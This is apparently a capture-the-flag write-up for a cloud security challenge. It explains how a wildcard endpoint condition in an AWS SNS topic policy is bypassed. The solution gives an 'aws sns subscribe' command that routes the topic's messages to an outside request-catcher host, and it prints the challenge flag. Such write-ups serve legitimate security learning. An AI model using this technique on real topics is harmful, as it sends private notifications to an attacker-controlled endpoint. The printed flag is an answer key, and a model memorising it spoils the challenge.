# Challenge number: 3

## Challenge Statement
Enable Push Notifications
We got a message for you. Can you get it?

## IAM Policy
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
### write a short analysis about the IAM policy here

* What do I have access to?
According to the above IAM policy SNS topic can send message subscribe to any endpoint ending with @tbic.wiz.io.
* What don't I have access to?
We do not have access to the mail box with the domain @tbic.wiz.io
* What do I find interesting?
It shows subscription  pending always because we cannot confirm it due to no aacees to the mail box


## Solution
As we cannot confirm the pending subscription, we can capture the request through a third party portal called requestcapture.com and make a post request with the following:

aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://foyzer.requestcatcher.com/test/e81ba3c4-f37e-4bb6-9041-bf194f97550b/@tbic.wiz.io

It will return a response message with a signingcerturl and then copy the url and paste it in a browser and then we will get a response message with  the flag.
The flag for this challenge is {wiz:always-suspect-asterisks}


## Reflection
* What was your approach?
To find a way how to get confirmation email after sending a message
* What was the biggest challenge?
To find an alternative to email notification that waits for confirming the subscription.
* How did you overcome the challenges?
 After lot of research in Google I was able to find the way. 
* What led to the break through?
After getting the portal of requestcapture.com, it was easy to get the flag.
* On the blue side, how can the learning be used to properly defend the important assets? 